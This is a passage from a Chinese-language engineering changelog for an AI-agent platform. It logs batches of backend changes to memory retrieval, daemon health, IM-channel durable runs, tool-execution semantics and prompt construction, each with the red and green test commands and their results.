pytest backend/tests/runtime/test_prompt_builder.py::TestDynamicSuffixCaps::test_memory_context_within_memory_budget_is_not_second_trimmed_to_ratio -q
```

初始结果:1 failed。失败点:预算内的 `SCORE_AWARE_TAIL_SENTINEL` 被旧 `0.6 * memory_budget_chars` 二次截断砍掉。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/runtime/test_prompt_builder.py::TestDynamicSuffixCaps \
  backend/tests/runtime/test_memory_section.py \
  backend/tests/runtime/test_prompt_sections.py::TestDynamicSuffixIntegration -q
python -m py_compile backend/app/runtime/prompt_builder.py backend/app/runtime/prompt_sections/memory.py
ruff check backend/app/runtime/prompt_builder.py backend/app/runtime/prompt_sections/memory.py \
  backend/tests/runtime/test_prompt_builder.py backend/tests/runtime/test_memory_section.py
```

当前结果:prompt-builder/memory-section 回归 22 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.31 2026-06-12 第三十一批:D6 repeated-feedback lane 接入 frozen-Mission gate（2026-06-19 被 Soul Candidate Package 取代）

**范围**
- 这段记录描述的是 2026-06-12 的旧中间态：当时 repeated-feedback lane 仍会生成 synthetic `soul_promotions`，再靠 frozen-Mission gate 阻拦。
- 2026-06-19 后 canonical 路径已改为 `soul_candidate` / Soul Candidate Package：Dream / Soul Writer 生成 `soul_pitch.md`、`soul_patch.md`、`soul.md.next`、`review.md`、`manifest.json`，平台只做 hard check / rollback / audit / atomic commit。
- 旧 `soul_promotions` 仅作为 stale-output compatibility 被 hold 和审计，不再允许写入 `soul.md`。

**代码证据**
- `backend/app/services/auto_dream.py`: `_apply_dream_decisions_unlocked()` 只提交通过 review rubric 的 `soul_candidate`；legacy `soul_promotions` 增加 `legacy_soul_promotions_held`，不再写 `soul.md`。
- `backend/tests/services/test_auto_dream.py`: 覆盖 reviewed Soul Candidate Package exact commit、legacy `soul_promotions` hold、prompt schema 禁止旧字段。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/services/test_auto_dream.py::TestDreamFrozenMissionGate::test_repeated_feedback_promotion_contradicting_frozen_mission_is_held -q
```

初始结果:1 failed。失败点:`_promote_repeated_feedback_to_soul()` 不接受 `contradiction_judge`,证明 repeated-feedback lane 没有接 frozen-Mission gate。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/services/test_auto_dream.py backend/tests/runtime/test_dream_template.py -q
python -m py_compile backend/app/services/auto_dream.py
ruff check backend/app/services/auto_dream.py backend/tests/services/test_auto_dream.py \
  backend/tests/runtime/test_dream_template.py
```

当前结果:auto_dream/DREAM 回归 95 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.32 2026-06-12 第三十二批:activation 死权重接通

**范围**
- `confidence_weight` 不再只认 `confidence`;现在同时识别生产 T3/T2 写入侧常用的 `conf` alias。
- `open_loop_weight` 不再把任意非空字符串当真;`open_loop=false` / `0` / 空值不会触发 open-loop pressure。
- T3 manifest 从 lifecycle access telemetry 派生 `retention_score`(0-1),让 `retention_weight` 有真实写入来源;同时把 `conf` 规范化为 `confidence` alias。
- high-priority T2 lane 不再丢弃 activation metadata;`confidence/conf`、`retention_score`、`open_loop`、feedback reaction metadata 会进入 `MemoryItem.metadata`,随后由 activation scorer 消费。

**代码证据**
- `backend/app/memory/activation.py`:新增 `_float_meta_any()` 与 `_bool_meta()`;`confidence_weight` 读 `confidence|conf`;`open_loop` 使用显式 truthy 解析。
- `backend/app/memory/md_store.py`:构建 `T3MemoryEntry.metadata` 时 joined metadata 规范化 `confidence`,并从 `compute_entry_heat()` 派生 `retention_score`。
- `backend/app/memory/t2_store.py`:T2 parser 保留 `open_loop` metadata。
- `backend/app/memory/retriever.py`:high-priority T2 `MemoryItem` 透传 `confidence/conf`、`retention_score`、`open_loop`、reaction/polarity/decision_ref。
- `backend/tests/memory/test_activation_scoring.py`:覆盖 `conf` alias 与 `open_loop=false`。
- `backend/tests/memory/test_md_store_metadata.py`:覆盖 T3 sidecar conf + access telemetry → manifest confidence/retention_score。
- `backend/tests/memory/test_retrieval_pipeline.py`:覆盖 high-priority T2 activation metadata 进入 reasons。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/memory/test_activation_scoring.py \
  backend/tests/memory/test_md_store_metadata.py::test_t3_manifest_derives_activation_aliases_from_sidecar \
  backend/tests/memory/test_retrieval_pipeline.py::test_high_priority_t2_preserves_activation_metadata -q
```

初始结果:4 failed。失败点:`conf` 未触发 `confidence_weight`;`open_loop="false"` 被当真;T3 manifest 无 `confidence/retention_score`;high-priority T2 activation reasons 缺 `open_loop_pressure/retention_score/confidence_weight`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/memory/test_activation_scoring.py backend/tests/memory/test_md_store_metadata.py \
  backend/tests/memory/test_retrieval_pipeline.py backend/tests/memory/test_t2_store.py \
  backend/tests/memory/test_t3_store.py backend/tests/memory/test_navigation_telemetry.py -q
python -m py_compile backend/app/memory/activation.py backend/app/memory/md_store.py \
  backend/app/memory/t2_store.py backend/app/memory/retriever.py
ruff check backend/app/memory/activation.py backend/app/memory/md_store.py \
  backend/app/memory/t2_store.py backend/app/memory/retriever.py \
  backend/tests/memory/test_activation_scoring.py backend/tests/memory/test_md_store_metadata.py \
  backend/tests/memory/test_retrieval_pipeline.py
```

当前结果:memory activation/retrieval 回归 52 passed,10 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.33 2026-06-12 第三十三批:PPR 主检索与 memory eval CI 门禁

**范围**
- `memory/wiki` 与 `memory/scenes` 的 KG/PPR read model 不再只是离线 `wiki_retrieval` 实验;主 `MemoryRetriever.retrieve()` 现在把 `search_wiki_pages(..., method=DEFAULT_WIKI_METHOD)` 的结果作为 `MemoryKind.SEMANTIC` 候选注入 prompt memory。
- wiki/scene hit 保留 Markdown derived/eval source:`source=memory/wiki/<slug>.md` 或 `memory/scenes/<slug>.md`,metadata 记录 `page_id/title/page_kind/source_type=wiki_ppr/method/source_ref/sensitivity`；默认 prompt memory 不再注入这些派生页。
- `app.memory.retrieval_eval` 增加可执行 CLI,同时跑 retrieval quality 与 retirement safety,并校验 `wiki_retrieval.DEFAULT_WIKI_METHOD` 必须等于 eval verdict。
- Harness CI 现在显式运行 `python -m app.memory.retrieval_eval --data-root /tmp/hive-memory-eval`,PPR 默认与退役安全不再靠人工记忆复跑。

**代码证据**
- `backend/app/memory/retriever.py`:新增 `_retrieve_wiki_pages()` 并在 `retrieve()` 中按 `semantic_limit` 接入;PPR 失败只 debug 降级为空,不阻断其他记忆层。
- `backend/app/memory/retrieval_eval.py`:新增 `run_memory_eval_suite()` 与 `main()`;输出 JSON,任何 gate 失败返回 exit 1。
- `.github/workflows/harness-ci.yml`:新增 `Memory retrieval and retirement eval` step。
- `backend/tests/memory/test_retrieval_pipeline.py`:新增 `test_retrieve_includes_ppr_wiki_pages_in_prompt_memory`,覆盖多跳邻居进入主 prompt memory。
- `backend/tests/memory/test_graph_ppr_eval.py`:新增 CLI 测试,覆盖 retrieval + retirement 两套 suite 都被执行。
- `backend/tests/evals/test_harness_ci_workflow.py`:workflow 路径改为基于 `__file__` 的 repo-root 解析,并断言 CI 包含 memory eval。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/memory/test_retrieval_pipeline.py::test_retrieve_includes_ppr_wiki_pages_in_prompt_memory -q
pytest backend/tests/memory/test_graph_ppr_eval.py::test_retrieval_eval_cli_runs_both_suites -q
cd backend && pytest tests/evals/test_harness_ci_workflow.py::test_harness_ci_runs_pytest_prompt_eval_and_self_evolution_bakeoff -q
```

初始结果:三处均失败。失败点分别为:主 `MemoryRetriever` 没有任何 `source_type=wiki_ppr` item;`app.memory.retrieval_eval` 没有 `main`;`.github/workflows/harness-ci.yml` 没有 `python -m app.memory.retrieval_eval`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/memory/test_graph_ppr_eval.py backend/tests/memory/test_retrieval_pipeline.py \
  backend/tests/evals/test_harness_ci_workflow.py -q
cd backend && python -m app.memory.retrieval_eval --data-root /tmp/hive-memory-eval-local
cd /Users/example-owner/vc-saas/hiveclaw-main
python -m py_compile backend/app/memory/retriever.py backend/app/memory/retrieval_eval.py
ruff check backend/app/memory/retriever.py backend/app/memory/retrieval_eval.py \
  backend/tests/memory/test_retrieval_pipeline.py backend/tests/memory/test_graph_ppr_eval.py \
  backend/tests/evals/test_harness_ci_workflow.py
```

当前结果:memory/PPR/CI 回归 34 passed;CLI report `passed=true`,且 retrieval slice 显示 PPR `recall_at_3=1.0`、`mrr=0.738`、multi-hop recall `1.0`,BM25 `recall_at_3=0.714`、`mrr=0.619`、multi-hop recall `0.333`;退役安全 5 checks 全部 passed;编译通过;ruff `All checks passed!`。

### 12.34 2026-06-12 第三十四批:health 真实化与 daemon liveness

**范围**
- `/api/health` 不再恒定返回 `{status:"ok"}`;它现在读取 daemon liveness registry,当核心后台任务进入 `error/crashed/stopped` 时返回 `status="degraded"`,并在 `components.daemons` 中暴露每个 daemon 的 state、last heartbeat、last error、tick/error/crash count。
- 新增进程内 `daemon_liveness` registry。它是 live health surface,不是审计日志;用于发现 API 进程仍活着但 `trigger_daemon/workflow_daemon/evolution_daemon` 已异常的情况。
- `trigger_daemon`、`workflow_daemon`、`evolution_daemon` loop 均写入 `mark_daemon_started/mark_daemon_tick/mark_daemon_error`;`main.py` 的 background-task done callback 对核心 daemon crash/意外退出写 `mark_daemon_crashed/mark_daemon_stopped`。
- Prometheus `/metrics` 新增 `hive_daemon_liveness_up`、`hive_daemon_last_heartbeat_age_seconds`、`hive_daemon_tick_total`、`hive_daemon_error_total`、`hive_daemon_crash_total`。

**代码证据**
- `backend/app/services/daemon_liveness.py`:新增 registry、snapshot、overall health status 与 test reset API。
- `backend/app/main.py`:startup 注册核心 daemon;task crash callback 写 liveness;`health_check()` 返回 `components.daemons`。
- `backend/app/schemas/schemas.py`:扩展 `HealthResponse.components`。
- `backend/app/memory/metrics.py`:Prometheus exporter 追加 daemon liveness 指标。
- `backend/app/services/trigger_daemon.py` / `workflow_daemon.py` / `evolution_daemon.py`:loop 写 started/tick/error;workflow tick exception 不再直接杀死 daemon,而是记录 error 后继续下一 tick。
- `backend/tests/api/test_health_liveness.py`:覆盖 health degraded、Prometheus 指标、核心 daemon loop wiring。
- `backend/tests/api/test_prometheus_metrics.py`:路径改为 `__file__` 推导 repo-root,避免只在 backend cwd 下通过。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/api/test_health_liveness.py -q
```

初始结果:2 failed。失败点:`app.services.daemon_liveness` 不存在,因此 health 无法表达 daemon degraded,Prometheus 也没有 daemon liveness 指标。随后补的 wiring 测试也失败,证明真实 daemon loop 尚未写入 registry。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/api/test_health_liveness.py backend/tests/api/test_prometheus_metrics.py \
  backend/tests/memory/test_metrics.py -q
python -m py_compile backend/app/services/daemon_liveness.py backend/app/main.py \
  backend/app/memory/metrics.py backend/app/services/trigger_daemon.py \
  backend/app/services/workflow_daemon.py backend/app/services/evolution_daemon.py \
  backend/app/schemas/schemas.py
ruff check backend/app/services/daemon_liveness.py backend/app/main.py \
  backend/app/memory/metrics.py backend/app/services/trigger_daemon.py \
  backend/app/services/workflow_daemon.py backend/app/services/evolution_daemon.py \
  backend/app/schemas/schemas.py backend/tests/api/test_health_liveness.py \
  backend/tests/api/test_prometheus_metrics.py backend/tests/memory/test_metrics.py
```

当前结果:health/metrics 回归 36 passed,10 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.35 2026-06-12 第三十五批:IM 通道 durable runtime wrapper 与完成回投

**范围**
- Feishu、DingTalk、WeCom、WeCom stream、WeChat Personal、Telegram、Slack、Discord、Microsoft Teams 的入站 user turn 不再同步长跑 `_call_agent_llm()`;入口保存 user `ChatMessage` 后统一调用 `_call_agent_llm(..., durable_run=True, durable_session=..., durable_user=...)`,由 `start_channel_chat_run_from_saved_turn()` 创建 `RuntimeTask(task_type="web_chat_turn")` 并后台执行。
- channel durable run 不重复保存 user message:入口已经落库的用户消息是唯一 source of truth;runtime metadata 标记 `existing_user_message_saved=True` 与 `latest_user_prompt_overrides_history=True`,vision/文件增强 prompt 可覆盖最后一条 user history。
- `ChatSession.delivery_target_json` 现在是所有 IM 后台完成回投的唯一落点。Slack、DingTalk、Discord、Microsoft Teams 原先缺失的 target 已补齐;WeCom/WeChat/Telegram/Feishu 复用已有 target。
- `ChannelDeliveryService.send_text()` 补齐 Slack、DingTalk、Discord、Microsoft Teams deferred text delivery;capability matrix 与 `identity_from_delivery_target()` 同步覆盖。
- Teams 路径统一为 canonical `microsoft_teams`;旧 `teams` 只在 `normalize_reply_target()` 作为兼容 alias 归一,不再出现在 session/source/channel runtime 标识里。

**代码证据**
- `backend/app/services/web_chat_runtime.py`:新增 `start_channel_chat_run_from_saved_turn()` 与 saved-turn queue path;channel run metadata 携带 `delivery_target_json/source/channel/existing_user_message_saved/latest_user_prompt_overrides_history`;执行时按 metadata 设置 runtime session channel/source。
- `backend/app/api/feishu.py`:文本与图片/vision 两条 `_call_agent_llm` 入口均加 `durable_run=True`、`durable_session=_sess`、`durable_user=resolved_user`。
- `backend/app/api/dingtalk.py`:新增 DingTalk `delivery_target_json(session_webhook/conversation_id/sender_staff_id)`;调用 durable runtime 并设置 `channel_delivery_target`。
- `backend/app/api/wecom.py`、`backend/app/services/wecom_stream.py`、`backend/app/services/wechat_personal_stream.py`、`backend/app/api/telegram.py`:现有 delivery target 与平台用户身份透传到 durable runtime。
- `backend/app/api/slack.py`:新增 Slack `delivery_target_json(channel_id/sender_id/user_label/session_id)`;同时设置 `channel_file_sender` 与 `channel_delivery_target`;调用 durable runtime。
- `backend/app/api/discord_bot.py`:后台 handler 保存 `interaction_token/channel_id/sender_id/user_label/session_id` 到 delivery target;调用 durable runtime。
- `backend/app/api/teams.py`:保存 Microsoft Teams `conversation_id/reply_to_id/sender_id/recipient/bot_id/session_id` target;`session_source/session_channel` 统一为 `microsoft_teams`;调用 durable runtime。
- `backend/app/services/channel_delivery_service.py`:新增 Slack/DingTalk/Discord/Microsoft Teams 能力矩阵、identity、deferred text delivery;legacy `teams` target 统一归一为 `microsoft_teams`。
- `backend/tests/api/test_channel_durable_runtime.py`:断言所有 IM `_call_agent_llm` 调用点都显式 opt-in `durable_run=True`;覆盖 `_call_agent_llm` durable branch 启动 channel runtime。
- `backend/tests/services/test_web_chat_runtime.py`:覆盖 channel saved-turn 创建 `RuntimeTask` 且不重复保存 user message。
- `backend/tests/services/test_channel_delivery_service.py`:覆盖 Slack/DingTalk/Discord/Microsoft Teams deferred delivery 与 Teams canonical identity/capability。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/api/test_channel_durable_runtime.py \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_slack_uses_channel_id \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_dingtalk_uses_session_webhook \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_discord_uses_interaction_followup \
  backend/tests/services/test_web_chat_runtime.py::test_start_channel_chat_run_from_saved_turn_creates_runtime_task_without_duplicate_user_message -q
```

初始结果:4 failed,2 passed。失败点:`feishu.py` 等 IM call site 尚未携带 `durable_run=True`;Slack/DingTalk/Discord 在 unified delivery 中返回 unsupported。

Teams 被纳入无 MVP 覆盖后的新增 Red:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/services/test_channel_delivery_service.py::TestResolveCapabilities::test_microsoft_teams_matrix \
  backend/tests/services/test_channel_delivery_service.py::TestIdentityFromDeliveryTarget::test_microsoft_teams_identity_uses_conversation_and_sender \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_microsoft_teams_uses_saved_conversation \
  backend/tests/api/test_channel_durable_runtime.py::test_all_im_call_sites_opt_into_durable_runtime -q
```

初始结果:4 failed。失败点:`microsoft_teams` capability/identity/send_text 未接入,Teams `_call_agent_llm` 调用点也未 durable opt-in。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/api/test_channel_durable_runtime.py \
  backend/tests/services/test_channel_delivery_service.py::TestResolveCapabilities::test_microsoft_teams_matrix \
  backend/tests/services/test_channel_delivery_service.py::TestIdentityFromDeliveryTarget::test_microsoft_teams_identity_uses_conversation_and_sender \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_slack_uses_channel_id \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_dingtalk_uses_session_webhook \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_discord_uses_interaction_followup \
  backend/tests/services/test_channel_delivery_service.py::TestSendText::test_send_text_microsoft_teams_uses_saved_conversation \
  backend/tests/services/test_web_chat_runtime.py::test_start_channel_chat_run_from_saved_turn_creates_runtime_task_without_duplicate_user_message -q

pytest backend/tests/api/test_channel_durable_runtime.py backend/tests/services/test_web_chat_runtime.py \
  backend/tests/services/test_channel_delivery_service.py backend/tests/api/test_feishu_channel_runtime.py \
  backend/tests/api/test_wecom_channel_runtime.py backend/tests/services/test_wecom_stream_runtime.py \
  backend/tests/services/test_wechat_personal_runtime.py backend/tests/api/test_telegram_channel.py \
  backend/tests/api/test_activity_chat_history_sessions.py backend/tests/api/test_chat_sessions_permissions.py -q

python -m py_compile backend/app/api/feishu.py backend/app/api/dingtalk.py backend/app/api/wecom.py \
  backend/app/api/slack.py backend/app/api/telegram.py backend/app/api/discord_bot.py \
  backend/app/api/teams.py backend/app/services/wecom_stream.py \
  backend/app/services/wechat_personal_stream.py backend/app/services/channel_delivery_service.py \
  backend/app/services/web_chat_runtime.py

ruff check backend/app/api/feishu.py backend/app/api/dingtalk.py backend/app/api/wecom.py \
  backend/app/api/slack.py backend/app/api/telegram.py backend/app/api/discord_bot.py \
  backend/app/api/teams.py backend/app/services/wecom_stream.py \
  backend/app/services/wechat_personal_stream.py backend/app/services/channel_delivery_service.py \
  backend/app/services/web_chat_runtime.py backend/tests/api/test_channel_durable_runtime.py \
  backend/tests/services/test_channel_delivery_service.py backend/tests/services/test_web_chat_runtime.py
```

当前结果:目标 Green 9 passed;通道/会话/投递回归 97 passed,10 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.36 2026-06-12 第三十六批:工具执行 P2 执行语义收口

**范围**
- 工具并行不再 all-or-nothing。混合 tool batch 进入有序 barrier 调度:parallel-safe 工具在连续安全段内并发;非 parallel-safe 工具等待它之前所有工具完成;安全工具也会等待它之前的非安全工具,从而保留副作用顺序。
- `cancel_event` 现在穿透到运行中的 tool coroutine。kernel 会把 tool task 与 cancel wait race;取消触发时 cancel tool task,记录 tool span `status=cancelled`,并返回 `*[Generation stopped]*`。
- 空 tool result 不再以空字符串/`None` 进入下一轮 prompt;统一归一为 `[Tool returned empty result]...`,让模型知道工具已执行但结果为空。
- max tool rounds exhausted 不再返回冷 `[Error] Too many tool call rounds`;改为可续跑话术,明确 current state 已保存、可 continue 或提高 `max_tool_rounds`。
- `RuntimeConfig.turn_token_budget` 新增 turn 级 token budget。若 LLM usage 已达到预算且下一步仍要 tool round,kernel 会在执行工具前保存状态并返回 token budget 终态,避免继续烧工具/模型轮次。

**代码证据**
- `backend/app/kernel/contracts.py`:新增 `RuntimeConfig.turn_token_budget: int | None = None`。
- `backend/app/kernel/engine.py`:新增 `_execute_tool_call_with_cancel()`、`_normalize_tool_result_for_llm()`、`_tool_round_limit_message()`、`_turn_token_budget_message()`。
- `backend/app/kernel/engine.py`:parallel branch 改为 segmented order-barrier 调度,基于 `is_parallel_safe_tool()` 控制并发与副作用顺序。
- `backend/app/kernel/engine.py`:`_execute_tool_with_hooks()` 对 `_KernelCancelledError` 单独记录并向上抛出;POST_TOOL_USE/event/span/prompt 使用归一后的 result string。
- `backend/app/kernel/engine.py`:LLM usage 累计后、tool execution 前检查 `turn_token_budget`;round limit 终态改用友好续跑消息。
- `backend/tests/kernel/test_parallel_tool_batch.py`:mixed batch 从“全串行”测试改为“read-only 段并行,write 有序”。
- `backend/tests/kernel/test_cancel_and_fallback.py`:新增运行中工具取消穿透测试。
- `backend/tests/kernel/test_engine.py`:新增空 tool result、turn token budget 测试;更新 max-round 终态断言。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/kernel/test_parallel_tool_batch.py::test_mixed_batch_parallelizes_read_only_segment_before_write \
  backend/tests/kernel/test_cancel_and_fallback.py::test_agent_kernel_cancels_running_tool_when_cancel_event_fires \
  backend/tests/kernel/test_engine.py::test_empty_tool_result_is_wrapped_with_actionable_message \
  backend/tests/kernel/test_engine.py::test_persist_memory_called_on_max_rounds_exceeded \
  backend/tests/kernel/test_engine.py::test_turn_token_budget_stops_before_next_tool_round -q
```

初始结果:5 failed。失败点分别为 mixed batch 中 read-only 工具串行超时、cancel 等慢工具完成、空工具结果为空字符串、max-round 冷错误、`RuntimeConfig` 无 `turn_token_budget`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/kernel/test_parallel_tool_batch.py::test_mixed_batch_parallelizes_read_only_segment_before_write \
  backend/tests/kernel/test_cancel_and_fallback.py::test_agent_kernel_cancels_running_tool_when_cancel_event_fires \
  backend/tests/kernel/test_engine.py::test_empty_tool_result_is_wrapped_with_actionable_message \
  backend/tests/kernel/test_engine.py::test_persist_memory_called_on_max_rounds_exceeded \
  backend/tests/kernel/test_engine.py::test_turn_token_budget_stops_before_next_tool_round -q

pytest backend/tests/kernel/test_parallel_tool_batch.py backend/tests/kernel/test_cancel_and_fallback.py \
  backend/tests/kernel/test_engine.py backend/tests/kernel/test_contracts.py -q

python -m py_compile backend/app/kernel/engine.py backend/app/kernel/contracts.py
ruff check backend/app/kernel/engine.py backend/app/kernel/contracts.py \
  backend/tests/kernel/test_parallel_tool_batch.py backend/tests/kernel/test_cancel_and_fallback.py \
  backend/tests/kernel/test_engine.py backend/tests/kernel/test_contracts.py
```

当前结果:目标 Green 5 passed;kernel 执行回归 67 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.37 2026-06-12 第三十七批:PTL 恢复顺序改为 LLM full-compress first

**范围**
- Prompt-too-long reactive retry 不再第一步机械丢弃 oldest round-group。
- 第一次 PTL retry 先调用 `maybe_compress_messages(..., compress_threshold=0.5, reason=prompt_too_long_retry)` 让 LLM 生成压缩上下文;只有压缩不足或后续仍 PTL 时才降级到 round-group truncation / final full-compress fallback。
- PTL retry 期间仍复用 `PROMPT_CACHE_BOUNDARY` 拆分逻辑:第一条 system 保持 frozen prefix,dynamic suffix 作为 transient `[System Notice]` tail message,避免 PTL 恢复路径重新污染 system cache prefix。

**代码证据**
- `backend/app/kernel/engine.py`:PTL 策略注释改为 `attempt 1 = full compression; later attempts fall back to dropping oldest round-groups`。
- `backend/app/kernel/engine.py`:在 `_is_prompt_too_long(exc)` 分支中新增 `ptl_retries == 0` full-compress path;成功压缩后发出 `session_compact` event,`strategy="full_compress"`、`attempt=1`。
- `backend/tests/kernel/test_engine.py`:原 round-group 首跳断言改为 `test_agent_kernel_emits_ptl_full_compress_before_round_group_retry_event`,并断言第一次 PTL event 是 `strategy="full_compress"`、`kept_message_count=3`。

**回归测试**

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/kernel/test_engine.py::test_agent_kernel_emits_ptl_full_compress_before_round_group_retry_event \
  backend/tests/kernel/test_engine.py::test_agent_kernel_emits_runtime_fallback_event_after_prompt_too_long \
  backend/tests/kernel/test_prompt_cache_integration.py -q

python -m py_compile backend/app/kernel/engine.py backend/app/kernel/contracts.py

ruff check backend/app/kernel/engine.py backend/app/kernel/contracts.py \
  backend/tests/kernel/test_engine.py backend/tests/kernel/test_prompt_cache_integration.py
```

当前结果:PTL/prompt-cache 回归 12 passed,10 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.38 2026-06-12 第三十八批:上下文 attachment、时间、prompt 规则与恢复指针收口

**范围**
- `tool_search` 发现的 deferred schemas 不再只靠事件/内部 `discovered_tools` 状态;每轮 dynamic suffix 都注入 `Runtime Tool Refresh` attachment,明确这些工具已可直接调用。
- 文件读写不再只记录路径;`SessionContext` 记录 `exists/size/mtime_ns` snapshot。后续轮次如果同一路径被外部进程修改/删除,注入 `Runtime File Change Notice`,提示先 `read_file("...")` 重新读取。
- 最近文件恢复不再把 `workspace/report.md` 当当前进程相对路径读,而是统一解析到 `<AGENT_DATA_DIR>/<agent_id>/workspace/report.md`;恢复标题保留完整相对路径,不是只显示 basename。
- `RecoveryManifest` 增加 `file_snapshots`,恢复文本把 recent reads/writes 渲染为精确 `read_file("path")` 指针。
- prompt sections 的三振规则只保留在 Operating Contract 的 `<three_strike_rule>`;`Doing Tasks` 只引用该规则,不再维护第二套不同表述。
- 双时钟收口:生产 `build_agent_context()` 默认不再把 runtime metadata/time 放入 frozen prefix;dynamic suffix 在已有 agent-local `## Current Time` 时,Environment section 不再附带第二个 UTC `Current time:`。

**代码证据**
- `backend/app/runtime/session.py`:新增 `file_snapshots`;`track_file_read()` / `track_file_write()` 支持 snapshot。
- `backend/app/kernel/engine.py`:新增 `_snapshot_session_file()`、`_resolve_session_file_path()`、`_build_runtime_attachment_sections()`;所有 `build_dynamic_prompt_suffix()` 调用统一追加 runtime attachments。
- `backend/app/kernel/engine.py`:`_build_restoration_context()` 用统一 resolver 读取最近文件,标题改为完整相对路径。
- `backend/app/runtime/recovery_manifest.py`:新增 `file_snapshots`;`to_restoration_text()` 输出 `reload with read_file("...")`。
- `backend/app/runtime/prompt_sections/environment.py`:新增 `include_time` 参数;`prompt_builder.py` 在 runtime metadata 已有 `## Current Time` 时关闭 Environment UTC 时间。
- `backend/app/services/agent_context.py`:`build_agent_context(include_runtime_metadata=False)` 默认值改为 false。
- `backend/app/runtime/prompt_sections/tasks.py`:删除重复三振细则,改为引用 operating contract。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/runtime/test_session_skill_lifecycle.py::test_file_tracking_records_version_snapshots \
  backend/tests/kernel/test_engine.py::test_build_restoration_context_resolves_relative_recent_file_paths \
  backend/tests/kernel/test_engine.py::test_runtime_attachment_sections_report_tool_refresh_and_external_file_changes -q

pytest backend/tests/runtime/test_prompt_sections.py::TestTasksSection::test_three_strike_rule_is_not_duplicated_here \
  backend/tests/runtime/test_prompt_sections.py::TestEnvironmentSection::test_dynamic_suffix_omits_utc_environment_time_when_runtime_time_exists \
  backend/tests/services/test_agent_context.py::test_build_agent_context_default_excludes_runtime_time_from_frozen_prefix -q
```

初始结果:6 failed。失败点分别为 `track_file_read()` 无 snapshot 参数、相对 recent file 恢复为空、runtime attachment helper 不存在、`Doing Tasks` 仍有独立三振表述、dynamic suffix 同时出现 agent-local time 与 UTC time、`build_agent_context()` 默认仍注入 Current Time。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/runtime/test_session_skill_lifecycle.py::test_file_tracking_records_version_snapshots \
  backend/tests/kernel/test_engine.py::test_build_restoration_context_resolves_relative_recent_file_paths \
  backend/tests/kernel/test_engine.py::test_runtime_attachment_sections_report_tool_refresh_and_external_file_changes -q

pytest backend/tests/runtime/test_prompt_sections.py::TestTasksSection::test_three_strike_rule_is_not_duplicated_here \
  backend/tests/runtime/test_prompt_sections.py::TestEnvironmentSection::test_dynamic_suffix_omits_utc_environment_time_when_runtime_time_exists \
  backend/tests/services/test_agent_context.py::test_build_agent_context_default_excludes_runtime_time_from_frozen_prefix -q

pytest backend/tests/runtime/test_session_skill_lifecycle.py backend/tests/runtime/test_recovery_manifest_persistence.py \
  backend/tests/runtime/test_prompt_sections.py backend/tests/runtime/test_prompt_builder.py \
  backend/tests/services/test_agent_context.py \
  backend/tests/kernel/test_engine.py::test_build_restoration_context_prefers_newest_recent_files \
  backend/tests/kernel/test_engine.py::test_build_restoration_context_resolves_relative_recent_file_paths \
  backend/tests/kernel/test_engine.py::test_build_restoration_context_restores_five_recent_files \
  backend/tests/kernel/test_engine.py::test_build_restoration_context_file_budget_uses_per_file_cap \
  backend/tests/kernel/test_engine.py::test_runtime_attachment_sections_report_tool_refresh_and_external_file_changes -q

python -m py_compile backend/app/runtime/session.py backend/app/kernel/engine.py \
  backend/app/runtime/recovery_manifest.py backend/app/runtime/prompt_sections/environment.py \
  backend/app/runtime/prompt_sections/tasks.py backend/app/runtime/prompt_builder.py \
  backend/app/services/agent_context.py

ruff check backend/app/runtime/session.py backend/app/kernel/engine.py \
  backend/app/runtime/recovery_manifest.py backend/app/runtime/prompt_sections/environment.py \
  backend/app/runtime/prompt_sections/tasks.py backend/app/runtime/prompt_builder.py \
